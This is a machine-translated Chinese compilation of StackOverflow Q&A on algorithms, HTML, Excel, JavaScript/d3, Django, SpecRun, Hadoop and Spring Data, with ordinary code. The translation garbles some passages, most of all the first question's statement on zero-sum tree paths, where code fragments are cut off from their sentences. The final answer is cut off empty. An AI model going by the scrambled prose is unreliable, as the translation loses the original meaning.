# StackOverflow 问答 15845000-15845999

# algorithm - 计算树中的零和路径

> ID：15845001
> 
> 赞同：5
> 
> 时间：2013-04-05T23:01:53.090
> 
> 标签：algorithm, graph, tree

我们得到一棵带有`N (up to 100,000)`节点的树。每条边的权重都是`+1`or `-1`，节点的编号从`1`到`N`。`(A, B)`在路径上存在多少个无序对`A -> X -> B`，其中`X`( ) 是和`X != A && X != B`之间路径上的某个顶点，路径上的边权重之和为 ，路径上的边权重之和为？`A``B``A -> X``0``X -> B``0`

因此，我们只关心偶数路径长度，否则边缘权重的总和不能是`0`。我们不能迭代潜在的`A`and `B`，否则我们会得到一个`O(N^2)`不会在 1 秒内运行的解决方案。关于如何解决它的任何提示？该程序应在 1 秒内运行，因此`O(N)`or`O(N logN)`解决方案将起作用。

编辑：但是，如果我们可以计算从每个节点开始的好路径的数量，我们将能够解决这个问题。可以计算这个吗？对我来说听起来很DP，但我不确定。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T04:40:50.337

我将在下面开发一个算法，从`O(N^2)`. 通过一个小的观察，我们可以将复杂性更改为更小的东西。我不太确定它会是什么（`O(N)`或`O(NlnN)`），但它似乎小于`O(N^2)`.

1.  在树中，选择任意叶节点`x0`，并创建一个空列表`L0`。
2.  跟随叶子节点向上一个分支。如果列表非空，则将此边缘权重的值添加到列表的每个项中，这将记录到目前为止的边缘权重的累积和。
3.  将此边缘权重附加到列表中。
4.  如果这个新节点只有 2 个分支，则通过沿唯一的新方向上行并更新来转到第 2 步`L0`。重复，直到新节点上有 3 个或更多分支。
5.  对于每个分支（除了我们来自的方向）递归地从步骤 1 开始在每个子树上，除了在该子树中将此节点标记为特殊节点。当递归回到这个节点时，它将合并（步骤 5）并停止。
6.  合并：我们现在有一组列表`L0, L1, L2, ...`必须合并到`L0`. 这些列表中的每一个都代表不同的路径及其各自的累积总和。对于每个列表中的每一对，将`m`这些和等于零的次数添加到计数器。**这为图中的每个可能路径关联了一个总和**。创建一个新列表`L0`，它是 set 的串联`L0, L1, L2, ...`。

上面的算法有效，但由于我们对每个图路径执行求和，因此成本必须至少为`O(N^2)`.

这里的诀窍是*不计算每条路径*。相反，如果我们对列表进行排序，确定两个排序大小的列表`k1,k2`是否具有固定总和`c`可以通过简单地遍历列表来完成，一个向前一个向后。因此，可以对操作中的每对列表进行计数，而`k1+k2`不是`k1*k2`像以前那样进行操作。合并列表也很简单，并且具有相同的复杂性，因为它们已经排序。

**奖励：**上述方法可以简单地扩展到任意边缘权重（不仅仅是`-1, 1`）和任意固定总和（不仅仅是零）。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-06T03:35:49.310

我不知道这是否有用，但如果有的话，我认为你可以使用这个属性：取一对`(A,B)`存在这样的路径。然后我们知道路径的边权重之和（我将其称为末端顶点的距离）`A -> ... -> B := d(A,B) = 0`，因为

`d(A,B) = d(A,X) + d(X,B) = 0 + 0 = 0`

正如您所说，我们只关心偶数长度的路径；这表明在实际检查对时，我们首先用两种颜色为树着色（因为所有树都是二分的），这可以在 Θ(n) 中贪婪地完成，并且只考虑每个颜色组内的顶点对。当然，这并没有提高我们必须考虑的对数的复杂性，因为我们在每种颜色中仍然有 (n/2)*(n-1)/2 个顶点，并且该术语在 Θ(n^ 2) 其中`n`是顶点数。

现在正如您所说，您可以使用 BFS 计算 Θ(n^2) 中的路径并检查每个颜色组中的所有顶点对。这是另一个可能对您有所帮助的想法：

假设我们有两个顶点 V 和 U `d(A,V) = d(A,U)`。我们有两种情况：

1.  `A -> ... -> V = A -> ... -> U -> ... -> V`, 表示 U (WLOG) 位于从 A 到 V 的唯一路径上。那么我们有

    `d(A,V) = d(A,U) + d(U,V) <=> d(A,V) = d(A,V) + d(U,V) <=> d(U,V) = 0`

    因此，如果 U 和 V 位于同一条路径上并且到 A 的距离相等，则距离`d(U,V) = 0`。

2.  两条路在某处分叉；让路径分叉的顶点为K。然后我们有

    `d(A,V) = d(A,K) + d(K,V) <=> d(K,V) = d(A,V) - d(A,K)`和

    `d(A,U) = d(A,K) + d(K,U) <=> d(K,U) = d(A,U) - d(A,K)`和

    `d(U,V) = d(K,U) + d(K,V) = d(A,U) + d(A,V) - 2*d(A,K) = 2*(d(A,U) - d(A,K)) = 2 * d(K,U)`

    因此，如果`U`并且`V`不在同一条路径上，它们之间的距离取决于顶点必须到`A`的距离和距离`A`必须到的距离`K`；或者，简化，就在任一顶点到 的距离上`K`。更一般地说，这一事实`d(A,U) = d(A,V)`仅意味着`d(U,V) = 0`任何一个顶点位于从`A`另一个顶点的路径上，所以如果后一种情况不是这种情况，你就不能真正以相等的距离告诉任何东西。

这是否会帮助你，我不知道。我无法弄清楚如何在次平方时间内实现您的要求，我认为这是不可能的；对我来说，这个问题感觉与所有对最短路径有很大关系，它的时间复杂度为 O(n^2)，每个顶点使用 BFS 作为起始顶点。不过，这更像是一种模糊的感觉，甚至比任何看似令人信服的论点都模糊。

# html - 在 tbody 中创建 HTML 页脚的语义方式？

> ID：15845005
> 
> 赞同：3
> 
> 时间：2013-04-05T23:02:49.107
> 
> 标签：html, semantic-markup

我正在构建一个 HTML 货币表。它旨在显示我每年、每月、每周和每天的付款和收入。这些行使用每个月的标签按月分组`<tbody>`，其中 tbody 的最后一行包含该月的总摘要：

```
<table id="paymentHistoryOverview" class="data money">
  <colgroup>
    <col class="date">
    <col class="description">
    <col class="money">
  </colgroup>
  <thead>
    <tr>
      <th>Date</th>
      <th>Description</th>
      <th>Amount</th>
    </tr>
  </thead>
  <tbody>
    <tr><th colspan="3">January 2013</th>
    <tr>
      <td>2013-04-05</td>
      <td>Salary</td>
      <td>100.00</td>
    </tr>
    <tr>
      <td>2013-04-08</td>
      <td>Rent</td>
      <td>-80.00</td>
    </tr>
    <tr>
      <td>Summary for january</td>
      <td>&euro 20.00</td>
    </tr>
  </tbody>
</table> 
```

正如您所看到的，每个月都包含某种页眉和页脚。有没有办法在语义上描述这样的东西来赋予它额外的价值？如果不是，那么`<strong>`每个摘要单元格中是否都是有效的语义解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T23:22:59.743

您可以将每个月单独放置以对其`<tbody>`进行语义分组。[这篇广受欢迎的帖子](https://stackoverflow.com/questions/3076708/can-we-have-multiple-tbody-in-same-table)说这样做是有效的。

# excel - Excel - VLOOKUP 返回 #VALUE

> ID：15845008
> 
> 赞同：0
> 
> 时间：2013-04-05T23:02:59.040
> 
> 标签：excel, excel-formula, vlookup

昨天我问[了这个](https://stackoverflow.com/questions/15825429/excel-mutiple-ifs-in-one-cell)问题。我尝试了另一个 VLOOKUP 公式，看看它有多么有用，但遇到了一个我似乎无法修复的非常奇怪的错误。我有以下一行数据

```
Probabilities| 1%, 1.9%, 4.6%, 9.3%, 16.2%, 25.9%, 37.5%, 50%, 62.5%, 74.1%, 83.8%, 90.7%, 95.4%, 98.1% 
```

每个项目都在一个名为“概率”的单独表格上的自己的单元格中。在我的第一张纸上`=VLOOKUP("Probabilities",Probability!$A$1:$O$1,A2+1,FALSE)`，A2 是 3 到 17 之间的数字。如果 A2 是 1，那么我会得到行标题“概率”。如果 A2 >= 2 我得到`error: Argument out of range: <Whatever A2 is +1>`. 我已经尝试了所有方法，从添加标题、将表值更改为整数，或者特别`="<some text>"`是看看它是否不喜欢 % 符号。单元格 A2 是另一个公式的结果，所以我也尝试直接在单元格中输入数字，并将公式中的 A2 替换为数字。我猜问题不在于索引。但我就是不知道是什么。在此先感谢您的帮助。让我知道是否需要更多信息

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T00:14:42.000

如果我正确理解您的问题，您想从“概率”表中的单行表中查找特定概率。该表在单元格 A1 中有一个标签，然后是具有跨列 B 到 O 列的概率量的单元格。单元格 A2 中的一个公式计算概率表中第 n 个值的索引号。您正在尝试找到一个返回第 n 个值的公式。

这应该有效：

```
 =OFFSET(Probability!$A$1,0,$A$2,1,1) 
```

OFFSET 的语法是“OFFSET(cell_reference, row_offset, column_offset, height_in_rows, width_in_columns)”，其中 cell_reference 是锚单元格，行和列偏移量表示向下（如果行偏移量为负数则向上）和向右（如果列偏移量为负数，则左）您想要返回一个值。

你的公式实际上应该有效（至少它在我的机器上有效）。我确实得到了#REF！当我使用的索引值超过概率表中的列数时出错，当值是字符串时出现 #N/A 错误，当 A2 是数字和字符串的总和时出现 #VALUE 错误。

# algorithm - 处理大序列输入时选择什么

> ID：15845015
> 
> 赞同：2
> 
> 时间：2013-04-05T23:03:36.487
> 
> 标签：algorithm, sorting, data-structures, hashtable

我最近偶然发现了一个问题

当每个序列可以有重复的数字并且大小相当大（接近一百万）并且处理的数据类型是Long时，如何找到两个序列的交集。

我考虑过排序和查找交集，这不是一个可行的解决方案我什至考虑过哈希表它不起作用，因为空间考虑必须是最佳的

有人可以建议处理它的更好方法吗？

感谢您阅读帖子

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T04:26:57.560

该问题声称“排序和查找交集......不是一个可行的解决方案”。但是，从编码的易用性和清晰性的角度来看，排序是最好的解决方案之一。对于任何一次性问题，花 10 分钟编写排序解决方案比花 15 分钟编写散列解决方案或半小时编写特殊树程序更合理。

在我的旧 PC（AMD Athlon 5000，约 2GHz）上，使用下面显示的 python 代码对一百万个 double 进行排序大约需要 1.3 秒，并且可能比当前处理器快四到五倍。在时间 O(n lg n) 中对两个数组进行排序，然后根据问题的要求在时间 O(n) 中查找匹配项，在现代 PC 上可能需要一两秒钟。

```
In [237]: import random

In [238]: v = [random.random() for i in range(1000000)]

In [239]: %time u = sorted(v)
CPU times: user 1.32 s, sys: 0.00 s, total: 1.32 s
Wall time: 1.33 s 
```

请注意，[问题 #8630965](https://stackoverflow.com/questions/8630965/measuring-time-for-sorting-1-million-floating-point-between-0-and-1-by-sort-in-a)指的是在 1.168 秒内对一百万个浮点值进行排序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T23:37:10.590

假设 long 是固定大小，比如 64 位。计划一棵深度最大为 64 的部分二叉树。对于第一个序列中的每个数字，您将生长这棵树。所有叶子都出现在深度 64。每个叶子都有两个整数，它们是引用两个序列的计数器。

```
for each number n in the first list
    current_node = root
    for i ranging from 1 to 64
        if the i-th bit of n is zero
            grow/traverse edge labeled 'zero' from current_node
        else
            grow/traverse edge labeled 'one' from current_node
        set current_node to be at end of this edge
    if the current_node (now at depth 64) is brand new
        set the node's first counter to 1; second counter to zero
    else
        increment current_node's first counter by 1 
```

第二部分是处理第二个列表，而是更新第二个计数器。如果需要，您也可以跳过创建新节点，因为那里不会有任何交叉点。然后遍历整个树并查看两个计数器都非零的位置。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T23:37:59.087

我认为每个列表有 2M 个条目的哈希表（因此哈希表负载保持相当低，在 50% 或更低）是一个不错的选择。如果您使用最简单的实现，则速度快，不是太大，只有 2M*4B（您的 long 是 4 字节长，对吗？）。

如果列表中的唯一值很少，排序/搜索树将比哈希表更紧凑，但如果唯一数字很多（您需要树中的子/父指针），它将比哈希表大节点，这就是开销）。

统计数据是什么？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-06T00:13:49.937

对我来说，问题归结为：

*   使用某种数据结构表示*稀疏*的第一个输入
*   将第二个输入作为键遍历它，进入上一步计算的数据结构。

我最初的想法也是一个哈希表。但是我们需要为每个数字一个节点。另一位作者已经有了这个想法。

我的第二个想法是 B+ 树。我们可以使用这棵树映射一个稀疏集。叶子可以包含一系列 nos ......这样，我们可以在寻找与第二个输入集的交集时消耗更多的 cpu 来搜索叶子。您确实支付了内部节点中 b+ 树索引的成本。假设我们不在树中存储重复项……不需要交集。我们可以使用基于位的存储来优化叶子以减少空间。

# javascript - iframe youtube 视频控制

> ID：15845016
> 
> 赞同：1
> 
> 时间：2013-04-05T23:03:41.817
> 
> 标签：javascript, html, css, youtube, youtube-api

**你好，**

我对javascript和html5真的很陌生（3周前才开始）所以我的问题可能看起来有点愚蠢。

所以我想知道是否可以使用 mouseleave.function 停止 youtube 视频...

我在我的网站上播放了一段音乐，当我翻转我的 youtube 视频时，音乐停止了，我是这样做的：

```
$(video).mouseenter(function(){
    audioElement.pause();
}); 
```

比我可以播放 youtube 视频...

当我离开视频播放器时，音乐再次响起，我使用这个：

```
$(video).mouseleave(function(){
    audioElement.play();
}); 
```

但我想让 youtube 视频同时停止，因为视频的声音正在播放，而我的背景音乐的声音正在播放......

```
$(video).mouseleave(function(){
    audioElement.play(); **Something here to pause the youbevideo**
}); 
```

是否可以？我想保留 youtube 视频的版本，因为我使用 fitvids 来调整我的视频大小。

谢谢

皮埃尔对不起我的英语...

**这是我的解决方案，RAVI。**

所以解决的办法就是把YouYube API脚本从外部js移到主html。

[http://users.skynet.be/fc864408/version9.html](http://users.skynet.be/fc864408/version9.html)

```
 <body>

      <div class="tf_content" id="page4">
        <div class="container">
            <div class="vendor" id="video">
     <div id="player"></div>

           </div>
       </div>
       </div>  

        <!-- The JavaScript -->

      <script>

      var tag = document.createElement('script');
 tag.src = "https://www.youtube.com/iframe_api";
      var firstScriptTag = document.getElementsByTagName('script')[0];
      firstScriptTag.parentNode.insertBefore(tag, firstScriptTag)

      var player;
      function onYouTubeIframeAPIReady() {
        player = new YT.Player('player', {
          height: '420',
          width: '640',
          videoId: 'lVQzIwpClXA?theme=light&color=white&autohide=0&autoplay=0&showinfo=0&rel=1&controls=1;',
          events: {
            'onReady': onPlayerReady,
            'onStateChange': onPlayerStateChange
          }
        });
      }
      function onPlayerReady(event) {

      } 
        var done = false;
      function onPlayerStateChange(event) {
        if (event.data == YT.PlayerState.PLAYING ) {
    audioElement.volume=0;
          done = true;
        }
      }

     video = document.getElementById("video");

            $(video).mouseleave(function(){
                   player.stopVideo()
                up();   
                });

 $(".container").fitVids(); 
```

现在它可以工作了......视频正在根据窗口调整大小。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T23:14:03.923

只需使用 (VideoElementID).play() 和 (VideoElementID).pause() 在鼠标事件上播放/暂停视频。您不需要单独播放/暂停音频和视频。

问候，拉维

# continuous-integration - SpecRun 使用 @ignore 测试返回退出代码 120

> ID：15845018
> 
> 赞同：2
> 
> 时间：2013-04-05T23:04:00.353
> 
> 标签：continuous-integration, specflow, exit-code, specrun

从命令行运行 SpecRun 作为持续集成设置的一部分，最近一个被忽略的 ( `@ignore`) 测试在 SpecRun 完成时生成了 120 的退出代码。

目前，我们在任何不等于 0 的退出代码上中断构建（通用成功指标！）。

退出代码 120 到底是什么意思？仅仅是“测试被忽略”吗？还是意味着更多？

还返回了哪些其他值？

下面的示例构建输出。我们收集所有的退出代码（目前是 1 个 SpecRun 任务，所以只收集了 1 个退出代码），并打印到“退出代码”

```
58>  Done.
58>  Result: all tests passed (5 ignored)
58>    Total: 478
58>    Succeeded: 473
58>    Ignored: 5
58>    Pending: 0
58>    Skipped: 0
58>    Failed: 0
58>  
58>    Execution Time: 00:00:42.4550000
58>
58>  exit codes 120
58>
58>Build FAILED.
58>
58>Time Elapsed 00:00:44.21
========== Rebuild All: 57 succeeded, 1 failed, 0 skipped ========== 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-17T22:02:51.053

我在论坛中找到了错误代码列表：[https ://groups.google.com/forum/?fromgroups=#!topic/specrun/vPQ7z2kpkbs](https://groups.google.com/forum/?fromgroups=#!topic/specrun/vPQ7z2kpkbs)

按错误代码排序列表后，您会得到：

```
Unknown = 0,
Succeeded = 110,
Ignored = 120,
Pending = 210 
NothingToRun = 310,
Skipped = 320,
Inconclusive = 410,
CleanupFailed = 420,
RandomlyFailed = 430,
Failed = 440,
InitializationFailed = 450,
FrameworkError = 510,
ConfigurationError = 520, 
```

基于此列表，我们在构建服务器上使用以下命令行脚本来执行测试：

```
SpecRun.exe [...]

if errorlevel 200 exit /b %errorlevel%

exit /b 0 
```

我们使用 exit 命令返回错误代码。对于更高级别的错误代码 (>= 200)，我们返回错误代码以中断构建。但是，低于该限制的错误代码被视为成功，我们返回 0。

使用此限制 (200)，成功和忽略的案例被视为成功，其他一切都会破坏构建。如果您还想允许挂起测试 (210)，您可以简单地检查 IF 中的更高错误代码。

# c# - 颜色替换 GDI C#

> ID：15845022
> 
> 赞同：1
> 
> 时间：2013-04-05T23:04:17.847
> 
> 标签：c#, bitmap, gdi+

## 用透明度GDI C#替换位图黑色像素

* * *

嘿伙计们，我正在研究一个渲染精灵的 2d 引擎。我需要用透明度替换位图中的黑色像素；以便看到下面的位图。

这在 GDI+ 中可行吗？如何？因为我一直在尝试使用 ColorMaps & Attributes 并且不能正常工作。

由于它是游戏的 2D 引擎，它是一个高效的库吗？或者我应该使用另一个？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T23:10:25.133

关于什么：

```
Bitmap bm = new Bitmap(width, height);
bm.MakeTransparent(Color.Black); 
```

GDI+ 不是游戏的最佳解决方案。到目前为止，您的游戏不需要高性能就可以使用它。但是当它需要一些功能时，您必须使用 OpenGL 或 Direct2D/Direct3D 等库。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T23:11:43.650

尝试：

```
bmp.MakeTransparent(Color.Black); 
```

至于游戏的高效库？在大多数情况下，没有。GDI+ 更多地是为业务线应用程序而设计的。

# python - 使用内置 AuthenticationForm 时的 Django-crispy-forms AttributeError

> ID：15845023
> 
> 赞同：3
> 
> 时间：2013-04-05T23:04:19.100
> 
> 标签：python, django, django-crispy-forms

我正在尝试使用 django-crispy-forms 在 django 中显示内置`AuthenticationForm`的登录视图。我在继承 AuthenticationForm 时遇到问题 - 我收到 AttributeError。错误说`'WSGIrequest' object has no attribute 'get'.`这是我的表格：

```
class LoginForm(AuthenticationForm):
    def __init__(self, *args, **kwargs):
        self.helper = FormHelper()
        self.helper.form_tag = False
        self.helper.layout = Layout(
            Field('username', placeholder="username"),
            Field('password', placeholder="password"),)
        super(AuthenticationForm, self).__init__(*args, **kwargs) 
```

我认为这个错误与通过重定向调用的登录视图有关（我正在使用`@login_required`装饰器）。是否有人对如何使用 django-crispy-forms 对内置表单进行子类化并避免此错误有任何想法？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-07T12:16:31.657

您的表单中似乎有错误：

```
class LoginForm(AuthenticationForm):
    def __init__(self, *args, **kwargs):
        super(LoginForm, self).__init__(*args, **kwargs)
        self.helper = FormHelper()
        self.helper.form_tag = False
        self.helper.layout = Layout(
            Field('username', placeholder="username"),
            Field('password', placeholder="password"),
        ) 
```

`AuthenticationForm`您正在调用 super，而不是传递父类`LoginForm`。

# javascript - 将颜色绑定到d3中的数据

> ID：15845024
> 
> 赞同：0
> 
> 时间：2013-04-05T23:04:19.880
> 
> 标签：javascript, d3.js, visualization

我正在复制 d3 库中的“甜甜圈倍数”（[http://bl.ocks.org/mbostock/3888852](http://bl.ocks.org/mbostock/3888852)）示例，用于不同目的：显示生物样本的 RNA 测序是否通过了一些质量控制测试。

到目前为止，我有这个代码：[http](http://tributary.io/inlet/5293726) : //tributary.io/inlet/5293726 为它的混乱道歉。您可以从示例中看到，饼图有 22 个切片，22 个测试中的每一个切片（对于感兴趣的人，每个测序读取 2x11 测试）。我知道这不是可视化这些信息的最佳方式，我计划使用堆叠条形图或矩阵来显示这些数据，但是 1\. 这可以在最初收集的布局中显示生物样本，在8x12 网格（不固定，需要调整浏览器大小）和 2\. 这是我现在所拥有的，学习将颜色绑定到 d3 元素的概念可以跨图表类型使用。

我的问题是：当我绑定数据时，与该元素关联的值现在是 100，我无法再访问我为单元格的每一行创建的其他对象，即具有`d.test_colors`与关联的颜色`PASS`、、`WARN`以及`FAIL`22 项测试中的每一项。

这是我想要工作的行：

```
 .style('fill', function (d,i) {
    console.log('in style fill: d', d)
    //          console.log(d.reads.if_experiment);
//    return d.data.test_colors[i];
              return '#A6CEE3'; 
}); 
```

现在它只返回浅蓝色，但我希望它返回 22 之一`test_colors`，因此`i`for 迭代数组。

查看“甜甜圈倍数”示例，他们将颜色域绑定到值，但我不确定如何将其集成到我的设置中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T00:43:39.773

原来诀窍是为你想要的“甜甜圈”的每个“切片”传递一个对象列表，并在这个对象中保存颜色信息。

关键代码在这里：

```
var pie = d3.layout.pie()
    .sort(null)
    .value(function (d) {
    return d.slice;
});
...
d.tests = []
...
(in a for loop)
    d.tests.push({color: r1Colors(d[test]), result: d[test], 
                        slice:100, test_name: test});
...
svg.selectAll(".arc")
    .data(function(d){
      return pie(d.tests); })
    .enter().append('path')
    .attr('class', 'arc')
    .attr('d', arc)
    .style('fill', function (d,i) {
    return d.data.color;
}); 
```

工作示例：[http ://tributary.io/inlet/5332310](http://tributary.io/inlet/5332310)

# facebook - Facebook 连接：用户可以查看我的应用程序的客户端 ID 吗？验证码是否应该发送给用户

> ID：15845028
> 
> 赞同：0
> 
> 时间：2013-04-05T23:04:43.193
> 
> 标签：facebook

我正在使用 facebook connect 让用户登录我的网站。我正在使用java。Facebook 文档说用户应该被重定向到 [https://www.facebook.com/dialog/oauth?client_id=YOUR_APP_ID&redirect_uri=YOUR_REDIRECT_URI&state=SOME_ARBITRARY_BUT_UNIQUE_STRING](https://www.facebook.com/dialog/oauth?client_id=YOUR_APP_ID&redirect_uri=YOUR_REDIRECT_URI&state=SOME_ARBITRARY_BUT_UNIQUE_STRING)。

如果用户知道我的 client_id（我的应用程序 ID）可以吗？

同样对于上述链接，facebook 将用户重定向到 YOUR_REDIRECT_URI?state=YOUR_STATE_VALUE&code=CODE_GENERATED_BY_FACEBOOK（在 oauth 请求中指定的 YOUR_REDIRECT_URI）。在这种情况下，用户可以看到他的访问令牌。这安全吗？

谢谢克里希纳

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T23:06:41.387

用户可以知道这些东西，他或他的朋友对此无能为力。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T23:15:18.990

你的 appID 是公开的，所以人们看到它并没有什么坏处，但我建议使用 Facebook SDK 库之一，因为没有官方的 Java 库，如果你想这样做，可以使用[JavaScript/AJAX SDK](https://developers.facebook.com/docs/reference/javascript/)客户端。

# hadoop - 为什么我的部分数据直接进入reducer而不进入combiner

> ID：15845029
> 
> 赞同：0
> 
> 时间：2013-04-05T23:04:58.897
> 
> 标签：hadoop, combiners

我正在使用 0.20.0 版的 hadoop。

我已经成功设置了组合器类。我的程序运行成功。

但是，我发现我的数据中有大约 5% 的数据从 mapper 出来后没有进入 combiner，这些数据直接进入了 reducer。我不知道为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T15:01:43.317

> 关于在 Hadoop 中实现组合器的说明：默认情况下，执行框架保留自行决定使用组合器的权利。**实际上，这意味着组合器可能会被调用零次、一次或多次。**此外，Hadoop 中的组合器实际上可能在 reduce 阶段被调用，即在键值对被复制到 reducer 之后，但在用户 reducer 代码运行之前。因此，必须仔细编写组合器，以便它们可以在这些不同的环境中执行。

您可以在下面的 PDF 的第 2.4 节中找到它

[使用 MapReduce 进行数据密集型文本处理](http://lintool.github.com/MapReduceAlgorithms/MapReduce-book-final.pdf)

# java - 没有找到类型 com.models.entities.OrderEntity 的属性

> ID：15845030
> 
> 赞同：0
> 
> 时间：2013-04-05T23:05:08.657
> 
> 标签：java, spring, log4j

我收到了错误`No property u found for type com.models.entities.OrderEntity`，我一生都无法弄清楚如何调试它的来源。我猜有一些不正确的映射。

我试过启用`log4j`它只给我关于`org.hibernate`. 我尝试添加其他包，但没有被读取。我相信我`log4j.properties`的位置正确。

![在此处输入图像描述](https://i.stack.imgur.com/zOlQS.png)

`log4j.properties`内容：

```
log4j.rootCategory=DEBUG, stdout

log4j.appender.stdout=org.apache.log4j.ConsoleAppender
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout
log4j.appender.stdout.layout.ConversionPattern=%d{ABSOLUTE} %5p %t %c:%L - %m%n

log4j.category.org.springframework.data=DEBUG,stdout
log4j.category.com.models.entities =DEBUG,stdout 
```

我可以做些什么来确保 log4j 正在记录正确的包？

我的实体：

```
@Entity
@Table(name = "`Order`")
@NamedQueries({
        @NamedQuery(name="Order.findByUUID", query="SELECT o FROM OrderEntity o WHERE o.uuid = :uuid"),
        @NamedQuery(name="Order.findByInProduction", query="SELECT o FROM OrderEntity o WHERE o.inProduction = :inProduction")
})
public class OrderEntity {
    private Integer id;

    @javax.persistence.Column(name = "id", nullable = false, insertable = true, updatable = true, length = 10, precision = 0)
    @GeneratedValue
    @Id
    public Integer getId() {
        return id;
    }

    public void setId(Integer id) {
        this.id = id;
    }

    private String uuid;

    @javax.persistence.Column(name = "uuid", nullable = false, insertable = true, updatable = true, length = 128, precision = 0)
    @Basic
    public String getUuid() {
        return uuid;
    }

    public void setUuid(String uuid) {
        this.uuid = uuid;
    }

    private Boolean inProduction;

    @javax.persistence.Column(name = "in_production", nullable = false, insertable = true, updatable = true, length = 0, precision = 0)
    @Basic
    public Boolean getInProduction() {
        return inProduction;
    }

    public void setInProduction(Boolean inProduction) {
        this.inProduction = inProduction;
    }

    private Timestamp updated;

    @javax.persistence.Column(name = "updated", nullable = true, insertable = true, updatable = true, length = 19, precision = 0)
    @Basic
    public Timestamp getUpdated() {
        return updated;
    }

    public void setUpdated(Timestamp updated) {
        this.updated = updated;
    }

    private Timestamp created;

    @javax.persistence.Column(name = "created", nullable = false, insertable = true, updatable = true, length = 19, precision = 0)
    @Basic
    public Timestamp getCreated() {
        return created;
    }

    public void setCreated(Timestamp created) {
        this.created = created;
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;

        OrderEntity that = (OrderEntity) o;

        if (created != null ? !created.equals(that.created) : that.created != null) return false;
        if (id != null ? !id.equals(that.id) : that.id != null) return false;
        if (inProduction != null ? !inProduction.equals(that.inProduction) : that.inProduction != null) return false;
        if (updated != null ? !updated.equals(that.updated) : that.updated != null) return false;
        if (uuid != null ? !uuid.equals(that.uuid) : that.uuid != null) return false;

        return true;
    }

    @Override
    public int hashCode() {
        int result = id != null ? id.hashCode() : 0;
        result = 31 * result + (uuid != null ? uuid.hashCode() : 0);
        result = 31 * result + (inProduction != null ? inProduction.hashCode() : 0);
        result = 31 * result + (updated != null ? updated.hashCode() : 0);
        result = 31 * result + (created != null ? created.hashCode() : 0);
        return result;
    }

    private VendorEntity vendor;

    @ManyToOne
    @javax.persistence.JoinColumn(name = "vendor_id", referencedColumnName = "id", nullable = false)
    public VendorEntity getVendor() {
        return vendor;
    }

    public void setVendor(VendorEntity vendor) {
        this.vendor = vendor;
    }

    private ShippingDestinationEntity shippingDestination;

    @ManyToOne
    @javax.persistence.JoinColumn(name = "shipping_destination_id", referencedColumnName = "id", nullable = false)
    public ShippingDestinationEntity getShippingDestination() {
        return shippingDestination;
    }

    public void setShippingDestination(ShippingDestinationEntity shippingDestination) {
        this.shippingDestination = shippingDestination;
    }

    private Collection<OrderCustomFieldEntity> orderCustomFields;

    @OneToMany(mappedBy = "order")
    public Collection<OrderCustomFieldEntity> getOrderCustomFields() {
        return orderCustomFields;
    }

    public void setOrderCustomFields(Collection<OrderCustomFieldEntity> orderCustomFields) {
        this.orderCustomFields = orderCustomFields;
    }

    private Collection<ProductEntity> products;

    @OneToMany(mappedBy = "order")
    public Collection<ProductEntity> getProducts() {
        return products;
    }

    public void setProducts(Collection<ProductEntity> products) {
        this.products = products;
    }
} 
```

堆栈跟踪：

```
Caused by: org.springframework.data.mapping.PropertyReferenceException: No property u found for type com.models.entities.OrderEntity
    at org.springframework.data.mapping.PropertyPath.<init>(PropertyPath.java:75)
    at org.springframework.data.mapping.PropertyPath.create(PropertyPath.java:327)
    at org.springframework.data.mapping.PropertyPath.create(PropertyPath.java:353)
    at org.springframework.data.mapping.PropertyPath.create(PropertyPath.java:307)
    at org.springframework.data.mapping.PropertyPath.from(PropertyPath.java:271)
    at org.springframework.data.mapping.PropertyPath.from(PropertyPath.java:245)
    at org.springframework.data.repository.query.parser.Part.<init>(Part.java:72)
    at org.springframework.data.repository.query.parser.PartTree$OrPart.<init>(PartTree.java:180)
    at org.springframework.data.repository.query.parser.PartTree$Predicate.buildTree(PartTree.java:260)
    at org.springframework.data.repository.query.parser.PartTree$Predicate.<init>(PartTree.java:240)
    at org.springframework.data.repository.query.parser.PartTree.<init>(PartTree.java:71)
    at org.springframework.data.jpa.repository.query.PartTreeJpaQuery.<init>(PartTreeJpaQuery.java:57)
    at org.springframework.data.jpa.repository.query.JpaQueryLookupStrategy$CreateQueryLookupStrategy.resolveQuery(JpaQueryLookupStrategy.java:90)
    at org.springframework.data.jpa.repository.query.JpaQueryLookupStrategy$CreateIfNotFoundQueryLookupStrategy.resolveQuery(JpaQueryLookupStrategy.java:162)
    at org.springframework.data.jpa.repository.query.JpaQueryLookupStrategy$AbstractQueryLookupStrategy.resolveQuery(JpaQueryLookupStrategy.java:68)
    at org.springframework.data.repository.core.support.RepositoryFactorySupport$QueryExecutorMethodInterceptor.<init>(RepositoryFactorySupport.java:279)
    at org.springframework.data.repository.core.support.RepositoryFactorySupport.getRepository(RepositoryFactorySupport.java:147)
    at org.springframework.data.repository.core.support.RepositoryFactoryBeanSupport.getObject(RepositoryFactoryBeanSupport.java:153)
    at org.springframework.data.repository.core.support.RepositoryFactoryBeanSupport.getObject(RepositoryFactoryBeanSupport.java:43)
    at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.doGetObjectFromFactoryBean(FactoryBeanRegistrySupport.java:142)
    ... 26 more 
```

**更新：**我刚刚从数据库中删除并重新生成了实体，但仍然收到相同的错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T13:47:01.730

